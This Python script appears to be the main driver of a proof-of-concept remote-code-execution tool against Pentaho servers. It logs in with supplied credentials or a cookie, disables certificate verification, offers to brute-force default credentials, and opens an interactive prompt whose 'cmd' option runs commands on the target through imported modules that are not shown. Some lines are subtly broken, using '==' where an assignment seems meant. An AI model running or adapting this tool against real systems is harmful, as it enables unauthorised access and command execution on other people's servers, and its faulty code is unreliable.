#!/usr/bin/python3

import argparse
import json
import requests
import sys
import time
import traceback
import zipfile

from colorama import Fore
from colorama import init
from urllib3.exceptions import InsecureRequestWarning

from pathlib import Path

# Import modules
from modules import config


from modules.auth.bruteforce import bruteforce_defaults
from modules.auth.login import login

# TO TEST
from modules.rce.run_command import run_command

# Colorama
init(autoreset=True)


def main():
	parser = argparse.ArgumentParser(description='## Pentaho RCE POC ##')
	parser.add_argument('pentaho_path', help='address of the server to connect to. (Example: http://localhost:8080/pentaho)')
	parser.add_argument('-u', dest='username', help='a valid username', default='')
	parser.add_argument('-p', dest='password', help='valid password for a given username', default='')
	parser.add_argument('--cookie', dest='cookie', help='Provide Cookie to login with', default='')
	
	args = parser.parse_args()
	config.username = args.username
	config.password = args.password
	config.pentaho_path = args.pentaho_path
	config.session = requests.session()

	
	# Disable check of self-signed certificates
	# Suppress only the single warning from urllib3 needed.
	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
	config.session.verify = False

	try:
		# Login Cookie not set
		if args.cookie == '':
			# try to connect to the target
			if login (config.username, config.password) != True:
				#Login failed
				print('Try to login default credentials?')
				choice = input('~? [y / N] ')
				if choice == 'Y' or choice == 'y':
					if bruteforce_defaults() == False:
						print('Sorry, no valid user found, falling back to anonymous mode')
						config.username == 'Anonymous'
					else:
						config.is_anon = False
				else:
					print('Falling back to Anonymous mode')
					config.username == 'Anonymous'
			else:
				config.is_anon = False
		else:
			#Login cookie set
			config.username == 'Cookie'
			login_cookie = args.cookie.split('=')
			config.session.cookies.update({login_cookie[0]: login_cookie[1]})

		# Loop to show main menu
		choice = ''
		while choice != 'quit' and choice != 'exit':
			choice = input('~# ')
			if choice == 'help':
				print('Available commands:')
				if config.is_anon == False:
					print('cmd				execute cmd command')
			elif choice == 'cmd':
				run_command()


	except Exception as fail:
		print("connection problem")
		print(fail)
		tb = traceback.format_exc()
		print(tb)
		sys.exit(1)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print()